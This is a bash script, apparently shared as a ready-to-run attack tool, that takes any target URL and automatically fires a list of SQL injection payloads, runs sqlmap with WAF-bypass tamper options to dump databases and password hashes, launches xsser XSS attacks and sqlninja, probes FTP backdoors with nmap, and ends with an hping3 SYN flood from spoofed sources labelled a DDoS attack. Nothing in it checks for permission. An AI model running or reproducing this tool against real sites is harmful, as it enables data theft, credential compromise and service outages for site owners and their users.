#!/bin/bash

# Author information
echo "by @Hagg4r"

# Function to run a command and return its output
run_command() {
    "$@" 2>&1
}

# Function to run a command with sudo and return its output
run_sudo_command() {
    sudo "$@" 2>&1
}

# Function to save data to a file
save_to_file() {
    local filepath="$1"
    local data="$2"
    echo "$data" >> "$filepath"
}

# Function to install necessary tools if not already installed
install_tools() {
    declare -A tools=(
        ["curl"]="curl"
        ["sqlmap"]="sqlmap"
        ["nmap"]="nmap"
        ["uniscan"]="uniscan"
        ["whois"]="whois"
        ["subfinder"]="subfinder"
        ["xsser"]="xsser"
        ["hping3"]="hping3"
        ["sqlninja"]="sqlninja"
        ["imagemagick"]="imagemagick"
        ["openvpn"]="openvpn"
    )

    for tool in "${!tools[@]}"; do
        echo "Checking if $tool is installed..."
        if ! command -v "$tool" &> /dev/null; then
            echo "$tool not found. Installing $tool..."
            run_sudo_command apt-get install -y "${tools[$tool]}"
        else
            echo "$tool is already installed."
        fi
    done
}

# Function to clear the terminal screen
clear_screen() {
    clear
}

# Function to print the animated header
print_header() {
    local colors=('\033[91m' '\033[93m' '\033[92m' '\033[94m' '\033[95m' '\033[96m')
    local header="
     __  .__   __.   ______  __    __   __          ___   .___________.  ______   .______      
|  | |  \\ |  |  /      ||  |  |  | |  |        /   \\  |           | /  __  \\  |   _  \\     
|  | |   \\|  | |  ,----'|  |  |  | |  |       /  ^  \\ `---|  |----`|  |  |  | |  |_)  |    
|  | |  . \`  | |  |     |  |  |  | |  |      /  /_\\  \\    |  |     |  |  |  | |      /     
|  | |  |\\   | |  \`----.|  \`--'  | |  \`----./  _____  \\   |  |     |  \`--'  | |  |\\  \\----.
|__| |__| \\__|  \\______| \\______/  |_______/__/     \\__\\  |__|      \\______/  | _| \`._____|
    "
    for color in "${colors[@]}"; do
        echo -e "$color$header"
        sleep 0.5
        clear_screen
    done
    echo -e "\033[0m"  # Reset color to default
}

# Function to check if the website is accessible
check_website_status() {
    local url="$1"
    if curl -s -o /dev/null -w "%{http_code}" "$url" | grep -q "200"; then
        echo "The website $url is accessible."
        return 0
    else
        echo "The website $url is not accessible."
        return 1
    fi
}

# Function to perform SQL Injection
perform_sql_injection() {
    local target_url="$1"
    local results_dir="$2"
    local payloads=(
        "' OR 1=1 --"
        "' OR '1'='1' --"
        "' OR '1'='1'/*"
        "' OR '1'='1'#"
        "' OR 1=1 UNION SELECT 1,2,3 --"
        "' OR 1=1 UNION SELECT NULL, NULL, NULL --"
        "' OR 1=1 UNION SELECT username, password FROM users --"
        "' OR 1=1 UNION SELECT table_name, column_name FROM information_schema.columns --"
        "' OR 1=1 UNION SELECT email FROM users --"
        "' OR 1=1 UNION SELECT password FROM users --"
        "' OR 1=1 UNION SELECT contact_name, contact_number FROM contacts --"
        "SELECT * FROM users WHERE username='admin';"
        "INSERT INTO users (username, password) VALUES ('newuser', 'newpassword');"
        "UPDATE users SET password='newpassword' WHERE username='admin';"
        "DELETE FROM users WHERE username='olduser';"
        "SELECT * FROM products WHERE name LIKE '%user_input%';"
        "SELECT * FROM products WHERE name LIKE '%admin%' UNION SELECT username, password FROM users;"
        "SELECT * FROM users WHERE username='user_input' AND password='password_input';"
        "SELECT * FROM users WHERE username='admin' AND password=' OR 1=1 -- ';"
        "SELECT * FROM products WHERE name LIKE '%user_input%';"
        "SELECT * FROM products WHERE name LIKE '%admin%' AND SLEEP(5);"
        "-- -"
        "-- /*"
        "-- #"
        "/*!*/"
        "OR 1=1"
        "OR 'a'='a'"
        "OR 'a'='a' --"
        "OR 'a'='a' /*"
        "OR 'a'='a' #"
        "OR 'a'='a' /*!' OR 'a'='a'"
    )

    local file_count=1
    for payload in "${payloads[@]}"; do
        local data="username=admin${payload}&password=password"
        local response
        response=$(curl -s -d "$data" -X POST "$target_url")
        local output_file="$results_dir/sql_injection_${file_count}.txt"
        save_to_file "$output_file" "$response"
        echo "Saved SQL Injection results to $output_file"
        ((file_count++))
    done
}

# Function to perform a SQLmap scan with WAF bypass
perform_sqlmap_scan() {
    local target_url="$1"
    local results_dir="$2"

    local cookie_file="$results_dir/cookies.txt"
    curl -c "$cookie_file" -s "$target_url" > /dev/null
    local cookies=$(awk '{print $6"="$7}' "$cookie_file" | tail -n +2 | tr '\n' ';')

    local commands=(
        "--dbs"
        "--tables"
        "--columns"
        "--dump"
        "--batch"
        "--level=5 --risk=3"
        "--technique=U"
        "--technique=T"
        "--passwords"
        "--users"
        "--current-user"
        "--current-db"
        "--is-dba"
        "--roles"
        "--privileges"
        "--fingerprint"
    )

    local waf_bypass_flags="--random-agent --tamper=space2comment,between,modsecurityversioned"

    local file_count=1
    for command in "${commands[@]}"; do
        local result
        result=$(run_command sqlmap -u "$target_url" --cookie="$cookies" $command --batch --forms --crawl=2 $waf_bypass_flags)
        local output_file="$results_dir/sqlmap_scan_${file_count}.txt"
        save_to_file "$output_file" "$result"
        echo "Saved SQLmap scan results to $output_file"
        ((file_count++))
    done
}

# Function to perform an FTP scan
perform_ftp_scan() {
    local target_url="$1"
    local results_dir="$2"
    local file_count=1
    local result
    result=$(run_command nmap -p 21 --script ftp-anon,ftp-bounce,ftp-libopie,ftp-proftpd-backdoor,ftp-vsftpd-backdoor,ftp-vuln-cve2010-4221 "$target_url")
    local output_file="$results_dir/ftp_scan_${file_count}.txt"
    save_to_file "$output_file" "$result"
    echo "Saved FTP scan results to $output_file"
    ((file_count++))
}

# Function to perform a Uniscan scan
perform_uniscan_scan() {
    local target_url="$1"
    local results_dir="$2"
    local result
    result=$(run_command uniscan -u "$target_url" -qdgsql)
    local output_file="$results_dir/uniscan_scan.txt"
    save_to_file "$output_file" "$result"
    echo "Saved Uniscan scan results to $output_file"
}

# Function to perform a WHOIS lookup
perform_whois_lookup() {
    local target_url="$1"
    local results_dir="$2"
    local result
    result=$(run_command whois "$target_url")
    local output_file="$results_dir/whois_lookup.txt"
    save_to_file "$output_file" "$result"
    echo "Saved WHOIS lookup results to $output_file"
}

# Function to perform a Subfinder scan
perform_subfinder_scan() {
    local target_url="$1"
        local results_dir="$2"
    local result
    result=$(run_command subfinder -d "$target_url")
    local output_file="$results_dir/subfinder_scan.txt"
    save_to_file "$output_file" "$result"
    echo "Saved Subfinder scan results to $output_file"
}

# Function to perform an XSS attack
perform_xss_attack() {
    local target_url="$1"
    local results_dir="$2"
    local result
    result=$(run_command xsser -u "$target_url" --auto)
    local output_file="$results_dir/xss_attack.txt"
    save_to_file "$output_file" "$result"
    echo "Saved XSS attack results to $output_file"
}

# Function to perform a DDoS attack
perform_ddos_attack() {
    local target_url="$1"
    local duration="$2"
    local results_dir="$3"
    echo "Starting DDoS attack on $target_url for $duration seconds..."
    local result
    result=$(run_command hping3 -c 10000 -d 120 -S -w 64 -p 80 --flood --rand-source "$target_url")
    local output_file="$results_dir/ddos_attack.txt"
    save_to_file "$output_file" "$result"
    echo "Saved DDoS attack results to $output_file"
}

# Function to access the database and download it
access_database() {
    local target_url="$1"
    local results_dir="$2"
    local result
    result=$(run_command sqlmap -u "$target_url" --dump-all --batch)
    local output_file="$results_dir/database_dump.txt"
    save_to_file "$output_file" "$result"
    echo "Saved database dump to $output_file"
}

# Function to perform an SQL injection using sqlninja
perform_sqlninja_attack() {
    local target_url="$1"
    local results_dir="$2"
    local config_file="$results_dir/sqlninja.conf"
    echo "Creating sqlninja config file..."
    echo "[target]" > "$config_file"
    echo "target = $target_url" >> "$config_file"
    local result
    result=$(run_command sqlninja -c "$config_file")
    local output_file="$results_dir/sqlninja_attack.txt"
    save_to_file "$output_file" "$result"
    echo "Saved sqlninja attack results to $output_file"
}

# Function to modify the image with a cat
modify_image() {
    local input_image="$1"
    local output_image="$2"
    local cat_image_url="https://example.com/path/to/cat_image.jpg" # Replace with a valid URL of a cat image
    curl -s -o "/tmp/cat_image.jpg" "$cat_image_url"
    convert "$input_image" "/tmp/cat_image.jpg" -gravity center -composite "$output_image"
    echo "Image modified and saved as $output_image"
}

# Main function to orchestrate the security scans
main() {
    # Install necessary tools
    install_tools
    
    # Print the animated header
    print_header
    
    # Clear the screen
    clear_screen
    
    # Get the target URL from the user
    read -p "Enter the target URL: " target_url
    
    # Create a results directory
    local results_dir="./results"
    mkdir -p "$results_dir"
    
    # Check if the website is accessible
    if check_website_status "$target_url"; then
        echo "Starting SQL Injection attempts..."
        perform_sql_injection "$target_url" "$results_dir"
        
        echo "Starting SQLmap scan with WAF bypass..."
        perform_sqlmap_scan "$target_url" "$results_dir"
        
        echo "Starting FTP scan..."
        perform_ftp_scan "$target_url" "$results_dir"
        
        echo "Starting Uniscan scan..."
        perform_uniscan_scan "$target_url" "$results_dir"
        
        echo "Starting WHOIS lookup..."
        perform_whois_lookup "$target_url" "$results_dir"
        
        echo "Starting Subfinder scan..."
        perform_subfinder_scan "$target_url" "$results_dir"
        
        echo "Starting XSS attack..."
        perform_xss_attack "$target_url" "$results_dir"
        
        echo "Accessing the database and downloading it..."
        access_database "$target_url" "$results_dir"
        
        echo "Starting SQL injection with sqlninja..."
        perform_sqlninja_attack "$target_url" "$results_dir"
        
        echo "Modifying image..."
        modify_image "/mnt/data/T545hx7v_400x400.jpg" "$results_dir/modified_image.jpg"
        
        echo "Starting DDoS attack..."
        perform_ddos_attack "$target_url" "60" "$results_dir"  # Run the DDoS attack for 60 seconds
        
    else
        echo "The website is not accessible. Exiting..."
    fi
}

# Run the main function
main